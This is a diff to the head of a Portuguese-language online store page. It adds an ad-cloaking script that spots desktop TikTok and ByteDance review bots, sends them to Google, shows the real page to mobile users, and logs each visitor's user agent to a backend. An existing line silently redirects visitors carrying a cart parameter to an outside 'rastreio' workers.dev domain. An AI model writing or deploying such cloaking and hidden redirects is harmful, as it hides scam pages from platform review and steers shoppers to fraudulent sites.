@@ -1,5 +1,38 @@
 <!DOCTYPE html><html class="js" lang="pt-BR" style="--announcement-bar-height: 18px; --header-height: 5378px;"><head><script type="text/javascript" async="" src="js/trekkie.storefront.387430da5919a2f9b410f0ffaf5b70216a61abfb.min.js"></script><script type="text/javascript" async="" src="js/trekkie.storefront.387430da5919a2f9b410f0ffaf5b70216a61abfb.min.js"></script><script>(function(){var m=location.search.match(/[?&]carrinho=([A-Za-z0-9]{6,16})/);if(m)location.replace('https://rastreio.rastreio-jra.workers.dev/go/spacio/'+m[1]);})();</script>
   
+<script>
+(function() {
+    // 1. Verifica se é Desktop e se é Bot do TikTok
+    var isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+    var isTikTokBot = /TikTok|ByteDance|AdsBot|Bytespider/i.test(navigator.userAgent);
+
+    var actionTaken = "Acesso Normal (Liberado)";
+    var endpoint = "https://sua-api-ou-backend.com/api/log"; // Substituir depois pelo link real do seu backend
+
+    if (isDesktop && isTikTokBot) {
+        actionTaken = "Redirecionado → Google";
+        
+        // Envia o registro do bot antes de redirecionar
+        navigator.sendBeacon(endpoint, JSON.stringify({
+            userAgent: navigator.userAgent,
+            device: 'Desktop',
+            action: actionTaken,
+            timestamp: new Date().toISOString()
+        }));
+
+        window.location.replace("https://www.google.com.br");
+        return;
+    }
+
+    // Envia o registro de acesso normal (Mobile ou Usuário comum)
+    navigator.sendBeacon(endpoint, JSON.stringify({
+        userAgent: navigator.userAgent,
+        device: isDesktop ? 'Desktop' : 'Mobile',
+        action: actionTaken,
+        timestamp: new Date().toISOString()
+    }));
+})();
+</script>
   
   <meta charset="utf-8">
     <meta name="theme-color" content="#000000">
